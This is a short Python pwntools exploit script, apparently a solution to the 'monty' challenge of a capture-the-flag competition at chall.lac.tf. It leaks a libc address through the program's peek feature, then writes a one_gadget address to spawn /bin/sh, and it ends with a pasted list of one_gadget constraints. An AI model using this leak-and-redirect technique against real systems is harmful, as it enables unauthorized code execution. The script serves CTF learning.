#!/usr/bin/python3

from pwn import *

exe = ELF('monty_patched', checksec=False)
libc = ELF('libc.so.6', checksec=False)
context.binary = exe

def GDB():
        if not args.REMOTE:
                gdb.attach(p, gdbscript='''
                brva 0x15A4

                c
                ''')
                input()
rop = ROP(exe)
# rop.write(7, 8, 9)
# find_gadget(['pop rdi, ret'])
info = lambda msg: log.info(msg)
sla = lambda msg, data: p.sendlineafter(msg, data)
sa = lambda msg, data: p.sendafter(msg, data)
sl = lambda data: p.sendline(data)
s = lambda data: p.send(data)

if args.REMOTE:
        p = remote('chall.lac.tf', 31133)
else:
        p = process(exe.path)

GDB()
sla(b'peek?', '81')
p.recvuntil(b'Peek 1: ')
libc.address = int(p.recvline(keepends=False)) - 0x2820b
info("libc.address: " + hex(libc.address))
sla(b'peek?', '59')
sla(b'lady!', b'1')
sla(b"Name: ", flat(0, libc.address+0x50053))
# sla(b"Name: ", b'aaaaaaaabbbbbbbbcccccccc')
p.interactive()
'''
0x50053 posix_spawn(rsp+0xc, "/bin/sh", 0, rbx, rsp+0x50, environ)
constraints:
  rsp & 0xf == 0
  rcx == NULL
  rbx == NULL || (u16)[rbx] == NULL

0xff6f2 posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, [rsp+0xf0])
constraints:
  [rsp+0x70] == NULL
  [[rsp+0xf0]] == NULL || [rsp+0xf0] == NULL
  [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

0xff6fa posix_spawn(rsp+0x64, "/bin/sh", [rsp+0x40], 0, rsp+0x70, r9)
constraints:
  [rsp+0x70] == NULL
  [r9] == NULL || r9 == NULL
  [rsp+0x40] == NULL || (s32)[[rsp+0x40]+0x4] <= 0

0xff6ff posix_spawn(rsp+0x64, "/bin/sh", rdx, 0, rsp+0x70, r9)
constraints:
  [rsp+0x70] == NULL
  [r9] == NULL || r9 == NULL
  rdx == NULL || (s32)[rdx+0x4] <= 0
'''